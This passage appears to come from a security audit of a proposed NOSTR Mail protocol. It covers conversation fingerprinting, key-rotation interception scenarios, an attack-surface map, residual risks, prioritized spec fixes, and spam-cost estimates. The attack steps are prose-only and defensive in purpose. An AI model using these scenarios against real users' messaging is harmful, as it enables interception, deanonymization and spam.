  3. The alternating A-to-B, B-to-A pattern with characteristic reply latencies (5 minutes, 7 minutes) forms a conversation fingerprint.
  4. The operator can distinguish this conversation from other Alice-Bob exchanges (e.g., a separate thread would have different timing patterns).
  5. Over time, the operator can estimate conversation length, message frequency, and response times for specific sender-recipient pairs.
  6. Against a powerful adversary (state-level, monitoring multiple relays), this fingerprint may be correlated with out-of-band intelligence to identify the conversation topic or context.
- **Impact**: Degrades conversation privacy beyond simple communication graph analysis. Reveals behavioral patterns (response times, conversation intensity, active hours).
- **Likelihood**: Medium. Requires sustained observation and timing correlation capability. Most effective against relay-operator adversaries or state-level adversaries with multi-relay visibility.
- **Recommended Mitigation**:
  1. Clients SHOULD add random delays to all message publications (reinforces FINDING-001 mitigation).
  2. Clients MAY generate dummy reply events at random intervals to obscure real conversation patterns.
  3. The protocol should acknowledge in its security considerations section that conversation fingerprinting is a residual risk that cannot be fully eliminated at the protocol level.
  4. For high-security users, recommend dedicated relays and Tor for all NOSTR connections.
- **Status**: Open

---

### FINDING-015: Key Rotation Mail Interception Window

- **Severity**: High
- **Component**: Identity / Encryption
- **Description**: When a user rotates their NOSTR keypair (e.g., due to suspected compromise, security hygiene, or migration), there is a transition window during which some senders know the old pubkey and some know the new pubkey. Messages encrypted to the old key become unreadable if the old private key is destroyed. Messages encrypted to the new key fail silently for senders who have not yet learned the new pubkey. There is no protocol-defined mechanism for key rotation announcements in the context of NOSTR Mail.
- **Attack Steps**:

  **Scenario A --- Message loss during rotation**:
  1. Alice generates a new keypair (pubkey_new) and publishes updated kind 0 (metadata) and kind 10050 (relay list) events.
  2. Alice destroys her old private key (privkey_old) for security.
  3. Bob, who cached Alice's old pubkey, sends a message encrypted to pubkey_old.
  4. Alice cannot decrypt this message (privkey_old is destroyed).
  5. Bob receives no error or bounce. The message is silently lost.

  **Scenario B --- Interception by compromised old key**:
  1. Alice suspects her old key is compromised and rotates to a new key.
  2. The attacker who compromised the old key continues to monitor relays for kind 1059 events addressed to pubkey_old.
  3. Senders who have not updated their cached pubkey continue sending to pubkey_old.
  4. The attacker decrypts and reads these messages.
  5. This continues until all of Alice's contacts have updated to pubkey_new.

  **Scenario C --- NIP-05 desynchronization**:
  6. Alice updates her NIP-05 to point to pubkey_new.
  7. Some clients cache the old NIP-05 resolution and continue using pubkey_old.
  8. Other clients fetch fresh and use pubkey_new.
  9. Alice receives some messages on the new key and misses others sent to the old key.

- **Impact**: Silent message loss during key rotation. Continued interception by an attacker who compromised the old key. Desynchronization where different senders encrypt to different keys.
- **Likelihood**: Medium. Key rotation is infrequent for most users but critical when it occurs (usually in response to a security incident, when the stakes are highest).
- **Recommended Mitigation**:
  1. **Define a key rotation protocol**: The NOSTR Mail spec MUST define a key rotation mechanism. The old key signs an event (e.g., kind 10XXX "key rotation announcement") that declares pubkey_new as the successor.
  2. **Transition period**: The old private key MUST remain active for *receiving* (but not sending) during a defined transition period (e.g., 30 days). All messages received on the old key during this period are re-encrypted to the new key.
  3. **Client behavior**: Clients that resolve a pubkey (via NIP-05 or cache) MUST check for key rotation announcements signed by that pubkey before encrypting.
  4. **NIP-05 grace period**: After NIP-05 is updated, clients SHOULD check both old and new pubkeys for a transition period.
  5. **Bounce mechanism**: If a relay receives a kind 1059 event for a pubkey that has published a key rotation announcement, the relay SHOULD respond with a NIP-65-style redirect pointing to the new pubkey (without revealing the new pubkey to unauthorized parties --- this is an open design problem).
- **Status**: Open

---

## Attack Surface Map

```
                         NOSTR Mail Protocol --- Attack Surface Map
  ============================================================================

  TRUST BOUNDARY: User Device
  +------------------------------------------------------------------+
  |  [Key Storage]                                                    |
  |   |                                                               |
  |   | FINDING-012: Weak RNG in key generation                       |
  |   |                                                               |
  |   v                                                               |
  |  [Draft Composition] -----> [Draft Storage on Relay]              |
  |   |                          FINDING-008: Metadata leakage        |
  |   |                                                               |
  |   v                                                               |
  |  [NIP-44 Encrypt] -------> [NIP-59 Wrap] -------> [Publish]      |
  |   |                         |                       |             |
  |   | FINDING-012:            | FINDING-012:          | FINDING-001:|
  |   |   Nonce reuse           |   Ephemeral key       |   Timing   |
  |   |                         | FINDING-005:          | FINDING-005:|
  |   |                         |   Multi-recip timing  |   Same IP  |
  |   |                         | FINDING-006:          |             |
  |   |                         |   Size correlation    |             |
  +------------------------------------------------------------------+
                                        |
                                        | WebSocket / Tor
                                        v
  TRUST BOUNDARY: Network
  +------------------------------------------------------------------+
  |  [DNS / NIP-05 Resolution]                                        |
  |   |                                                               |
  |   | FINDING-004: Domain hijacking                                 |
  |   | FINDING-015: Key rotation desync                              |
  |   |                                                               |
  +------------------------------------------------------------------+
                                        |
                                        v
  TRUST BOUNDARY: Relay
  +------------------------------------------------------------------+
  |  [L402 Payment Gate]                                              |
  |   |                                                               |
  |   | FINDING-011: Macaroon scope creep                             |
  |   |                                                               |
  |   v                                                               |
  |  [Event Storage (kind 1059)]                                      |
  |   |                                                               |
  |   | FINDING-003: Flooding via ephemeral keys                      |
  |   | FINDING-007: State replay (kind 10099)                        |
  |   |                                                               |
  |   v                                                               |
  |  [Metadata Logging]                                               |
  |   |                                                               |
  |   | FINDING-001: Timing correlation                               |
  |   | FINDING-005: Multi-recipient correlation                      |
  |   | FINDING-014: Conversation fingerprinting                      |
  |   |                                                               |
  +------------------------------------------------------------------+
                                        |
                                        v
  TRUST BOUNDARY: Cashu Mint
  +------------------------------------------------------------------+
  |  [Token Redemption]                                               |
  |   |                                                               |
  |   | FINDING-002: Double-spend race                                |
  |   | FINDING-010: Refundable postage abuse                         |
  |   |                                                               |
  +------------------------------------------------------------------+
                                        |
                                        v
  TRUST BOUNDARY: SMTP Bridge
  +------------------------------------------------------------------+
  |  [Inbound: Email -> NOSTR]     [Outbound: NOSTR -> Email]        |
  |   |                             |                                 |
  |   | FINDING-013: HTML injection | FINDING-013: Header injection   |
  |   | FINDING-013: Efail-style    | FINDING-013: DKIM replay        |
  |   |                             |                                 |
  +------------------------------------------------------------------+
                                        |
                                        v
  TRUST BOUNDARY: Recipient Device
  +------------------------------------------------------------------+
  |  [Event Retrieval] --> [NIP-44 Decrypt] --> [Cashu Redeem]        |
  |   |                     |                    |                    |
  |   | FINDING-003:        | FINDING-009:       | FINDING-002:      |
  |   |   CPU exhaustion    |   (If PoW-only     |   Double-spend    |
  |   |   from garbage      |    free tier)       |   (token already  |
  |   |   events            |                    |    spent)          |
  |   |                     v                    |                    |
  |   |                    [Content Render]       |                    |
  |   |                     |                    |                    |
  |   |                     | FINDING-013:       |                    |
  |   |                     |   XSS from bridged |                    |
  |   |                     |   content           |                    |
  |   |                     v                    v                    |
  |   |                    [State Sync (kind 10099)]                   |
  |   |                     |                                         |
  |   |                     | FINDING-007: Replay attack              |
  |   |                     | FINDING-015: Key rotation confusion     |
  |   |                                                               |
  +------------------------------------------------------------------+
```

---

## Residual Risk Assessment

After implementing all recommended mitigations, the following risks remain that **cannot be fully eliminated by protocol design alone**:

### Irreducible Risks

| Risk | Residual Severity | Explanation |
|------|-------------------|-------------|
| **No forward secrecy** | High | NIP-44 uses static ECDH. Compromise of a long-term private key exposes all past messages. Mitigation would require a double-ratchet protocol (Signal-style), which is incompatible with the asynchronous, multi-relay nature of NOSTR Mail. This is an accepted architectural tradeoff. |
| **Recipient visible to relay** | Medium | The `p` tag on kind 1059 events is necessary for relay routing and recipient retrieval. Hiding the recipient would require private information retrieval (PIR), blind token schemes, or broadcast encryption --- all of which are either impractical at scale or introduce unacceptable latency. |
| **Timing correlation (reduced)** | Medium | Random delays and cover traffic reduce but do not eliminate timing correlation. A sufficiently powerful adversary (monitoring all relays, with long observation periods) can still perform statistical deanonymization. This is analogous to Tor's known weakness against global passive adversaries. |
| **No post-quantum security** | Medium | NIP-44 v2 uses secp256k1 ECDH, which is vulnerable to quantum attack (Shor's algorithm). NIP-44 is versioned, enabling a future upgrade to post-quantum key exchange (e.g., ML-KEM/Kyber). Until then, "harvest now, decrypt later" is a risk for high-value targets. |
| **Relay censorship** | Medium | Relays can silently drop kind 1059 events. Mitigated by relay redundancy (kind 10050 lists multiple relays), but a coordinated relay-level block could suppress mail to a targeted user. |
| **Cashu mint trust** | Medium | Even with P2PK locking, the Cashu mint can still refuse to honor tokens, selectively censor redemptions, or go offline. Mitigated by multi-mint support and mint diversity, but the ecash model inherently requires some trust in the mint. |
| **Bridge as centralized component** | Medium | The SMTP bridge is a single point of failure and a high-value target. Mitigated by allowing multiple independent bridges, but each bridge operator must be trusted with cleartext email content on the legacy side. |

### Risks Requiring Ongoing Monitoring

| Risk | Escalation Trigger | Monitoring Method |
|------|-------------------|-------------------|
| GPU PoW farming | Observed spam campaigns with high-difficulty PoW produced at scale | Monitor relay event rates and PoW difficulty distributions |
| Cashu mint compromise | A major mint is compromised, turns malicious, or selectively censors | Community reporting; multi-mint redundancy |
| NIP-05 domain hijacking | Observed attacks redirecting mail via DNS compromise | Certificate Transparency monitoring; community reporting |
| Quantum computing advances | Practical quantum computers capable of Shor's algorithm on 256-bit curves | Track NIST PQC standardization and quantum computing milestones |
| Novel cryptanalytic attacks on ChaCha20 or secp256k1 | Published cryptanalysis reducing security margins | Monitor ePrint and major crypto conferences |

---

## Recommendations for Spec

### Priority 1 --- Must-Have Before Any Production Deployment

1. **Mandate P2PK Cashu tokens (NUT-11) for all postage.** Without this, the postage anti-spam model is trivially defeated by double-spend (FINDING-002). This is the single most important specification change.

2. **Upgrade NIP-59 RNG requirement to MUST-level language.** The specification MUST require CSPRNG for ephemeral key generation and NIP-44 nonce generation. Provide per-platform implementation guidance (FINDING-012).

3. **Define relay rate limiting for kind 1059 events.** Specify recommended per-recipient (`p` tag) rate limits, independent of sender pubkey. Recommend minimum PoW or L402 payment for kind 1059 events from unknown senders (FINDING-003).

4. **Publish bridge security requirements.** Define mandatory input sanitization rules, DKIM signing practices, From-address rewriting, and HTML sanitization requirements for SMTP bridges (FINDING-013).

5. **Define a key rotation protocol.** Specify how users announce key rotation, how the transition period works, and how clients should handle encountering a rotated key (FINDING-015).

### Priority 2 --- Should-Have for Production Readiness

6. **Specify multi-recipient submission guidelines.** Recommend staggered timing (random delay per recipient), independent padding, and multi-relay distribution for multi-recipient messages (FINDING-005, FINDING-006).

7. **Define L402 credential requirements.** Mandate tight macaroon caveats (single recipient, short expiry, limited event count) and preimage tracking for relay L402 implementations (FINDING-011).

8. **Add NIP-05 pubkey pinning recommendation.** Clients SHOULD cache NIP-05-to-pubkey mappings and warn users on changes. Recommend DNSSEC for NIP-05 domain operators (FINDING-004).

9. **Recommend random publication delays.** Clients SHOULD add 0--300 second random delays before publishing kind 1059 events to resist timing correlation (FINDING-001).

10. **Define mailbox state validation rules.** Relays MUST reject kind 10099 events with future timestamps beyond a tolerance. Clients SHOULD use monotonic counters for state versioning (FINDING-007).

### Priority 3 --- Research and Long-Term Improvements

11. **Investigate memory-hard proof-of-work.** Evaluate replacing SHA-256 PoW with Argon2 or RandomX to resist GPU/ASIC acceleration. Would require a NIP-13 amendment or new NIP (FINDING-009).

12. **Explore blind relay routing.** Research private information retrieval (PIR) or blind token schemes to hide the recipient from relay operators.

13. **Design a cover traffic protocol.** Specify dummy event generation patterns to resist traffic analysis and conversation fingerprinting (FINDING-001, FINDING-014).

14. **Commission formal verification.** The composition of NIP-44 + NIP-59 + Cashu + L402 introduces emergent complexity. Formal analysis (e.g., using ProVerif or Tamarin) of the composed protocol would provide stronger security guarantees.

15. **Plan post-quantum migration path.** Define how NIP-44 v3 (or a successor) would introduce post-quantum key exchange while maintaining backward compatibility during a transition period.

---

## Appendix A: Severity Definitions

| Severity | Definition |
|----------|-----------|
| **Critical** | A fundamental security mechanism is defeated. Exploitation is trivial, requires no special resources, and is likely to occur in practice. Deployment MUST NOT proceed until mitigated. |
| **High** | Significant security or privacy impact. Exploitation is feasible with moderate resources or specific conditions. Fix required before production use. |
| **Medium** | Moderate security or privacy impact. Exploitation requires specific conditions, sustained observation, or non-trivial resources. Fix recommended before production use. |
| **Low** | Minor security or privacy impact. Exploitation requires unlikely conditions or provides limited attacker benefit. Fix on a best-effort basis. |
| **Informational** | Design consideration, theoretical risk, or defense-in-depth recommendation. No immediate exploitation path. |

## Appendix B: Economic Reference Data

| Resource | Estimated Cost (2026) |
|----------|-----------------------|
| RTX 4090 GPU rental (cloud) | ~$0.50/hour |
| Bitcoin ASIC rental (100 TH/s) | ~$2.00/hour |
| 1 Cashu sat (at $30,000/BTC) | ~$0.0003 |
| NOSTR keypair generation | Free (microseconds) |
| NIP-05 domain registration | $10--15/year |
| Relay hosting (VPS, basic) | $5--20/month |
| SMTP bridge hosting | $20--50/month |
| Tor circuit establishment | Free (~2 seconds) |

### Spam Economics Summary

| Scenario | PoW Only (28-bit) | P2PK Cashu (10 sat) | Combined | Notes |
|----------|-------------------|----------------------|----------|-------|
| 1,000 spam msgs | CPU: 67 hrs; GPU: 4 min | 10,000 sats (~$3) | GPU: 4 min + $3 | GPU makes PoW trivial |
| 100,000 spam msgs | CPU: 278 days; GPU: 7 hrs | 1M sats (~$300) | GPU: 7 hrs + $300 | Cashu is the real deterrent |
| 1M spam msgs | Infeasible CPU; GPU: 69 hrs | 10M sats (~$3,000) | GPU: 69 hrs + $3,000 | Meaningful deterrent at scale |
| With double-spend (unfixed) | Same | $0 (all reclaimed) | GPU time + $0 | Cashu deterrent collapses entirely |

At 10 sats per message with P2PK locking and 0.01% spam conversion rate ($10 value per conversion), spam is unprofitable at every scale tested.

## Appendix C: Related Documents

- `nips/messaging/nip-44.md` --- NIP-44 v2 encryption specification
- `nips/messaging/nip-59.md` --- NIP-59 Gift Wrap specification
- `nips/security/nip-13.md` --- NIP-13 Proof of Work specification
- `nips/payments/nip-57.md` --- NIP-57 Lightning Zaps specification
- `guides/encryption-guide.md` --- Encryption implementation guide
- `guides/security-checklist.md` --- Security checklist for NOSTR applications
- `reviews/security-audits/phase2-economic-analysis.md` --- Phase 2 economic analysis (companion document)
